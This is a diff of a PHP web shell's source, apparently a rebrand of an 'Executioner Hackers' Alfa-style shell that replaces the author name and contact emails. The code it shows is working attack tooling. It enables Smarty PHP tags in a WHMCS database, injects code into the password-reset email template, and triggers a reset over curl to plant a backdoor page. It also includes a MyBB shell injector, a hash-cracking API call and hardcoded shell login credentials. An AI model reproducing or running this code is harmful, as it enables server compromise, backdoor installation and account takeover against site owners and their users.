@@ -1,11 +1,11 @@
 <?php
 /*
-	Author: 	Adnan Sami
-	Email:		adnansami1992sami@gmail.com
+	Author: 	Ajaxhunter
+	Email:		ajaxhunter@ajaxhunter.com
 	Date:		Monday, January 4, 2021
 */
 $GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'adnan',
+    'username' => 'ajaxhunter',
     'password' => '881bf99d1f36813c9124dfcc29e928aa',//md5(ehsan)
     'safe_mode' => '1',
     'login_page' => 'gui',
@@ -1560,7 +1560,7 @@ if(empty($about_us)){
 $about_us = "<pre><center><img src='https://raw.githubusercontent.com/Executioner-Hackers/executioner-shell/main/Capture.JPG'><br>
 <b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
 <font color='#00A220'>Shell Coded By Executioner Hackers</font><br>
-<font color='#00A220'>Contact : adnansami1992sami@gmail.com</font><br>
+<font color='#00A220'>Contact : ajaxhunter.com</font><br>
 <font color='#FF0000'>############</font><br>
 </center></pre><iframe src='https://instagram.com/executioner_hackers' frameborder='0' width='0' height='0'></iframe>";
 }
@@ -1887,19 +1887,20 @@ $tempSave = str_replace("'","\'",$tempSave1);
 mysqli_query($conn,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die (mysqli_error($conn));
 $inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE name='Password Reset Validation'";
 $result = mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('adnansami1992sami@gmail.com')";
+$create = "insert into tblclients (email) values('
+lol@gmail.com')";
 $result2 = mysqli_query($conn,$create) or die (mysqli_error($conn));
 if(function_exists('curl_version') && $method == 'auto'){
 $AlfaSole = new AlfaCURL(true);
 $saveurl = $AlfaSole->Send($path."/pwreset.php");
 $getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
-$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=adnansami1992sami@gmail.com");
+$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=lel@gmail.com");
 $backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
 $Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
 __alert("shell injectet...");
 $ff= 'http://'.$path."/solevisible.php";
 output($ff);}else{
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>adnansami1992sami@gmail.com</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
+echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>hur@gmail.com</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
 }if(isset($_POST['alfa2']) && $_POST['alfa2']== 'mybb'){
 AlfaNum(1,2,3,5);
 echo __pre()."<p><div class='txtfont_header'>| MyBB |</div></p><center><center>".getConfigHtml("mybb")."<form id='sendajax' onSubmit=\"g('ShellInjectors',null,null,'mybb',null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.prefix.value); return false;\" method=POST>
@@ -2227,7 +2228,7 @@ if($_POST['alfa3'] == '>>'){
 $hash = $_POST['alfa2'];
 if(!empty($hash)){
 $hash_type = $_POST['alfa4'];
-$email = "adnansami1992sami@gmail.com";
+$email = "j@gmail.com";
 $code = "7b9fa79f92c3cd96";
 $target = "https://md5decrypt.net/Api/api.php?hash=".$hash."&hash_type=".$hash_type."&email=".$email."&code=".$code;
 $resp = @file_get_contents($target);
@@ -2296,7 +2297,7 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 <input type='hidden' name='ajax' value='true'>
 <input type='hidden' name='alfa1' value='uploadFile'>
 <input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./Executioner Hackers&copy; 2019-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>adnansami1992sami@gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href=''>@Executioner-Hackers</a></span></div></td>
+<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./Executioner Hackers&copy; 2019-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>@gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href=''>@Executioner-Hackers</a></span></div></td>
 </tr>
 </table>
 </div>
@@ -3453,7 +3454,7 @@ $tempSave1 = $soleGet['message'];
 $tempSave = str_replace("'","\'",$tempSave1);
 $inject = "UPDATE tblemailtemplates SET message='$Def' WHERE name='Password Reset Validation'";
 $result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('adnansami1992sami@gmail.com')";
+$create = "insert into tblclients (email) values('i@gmail.com')";
 $result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
 if(function_exists('curl_version')){
 $AlfaSole = new AlfaCURL(true);
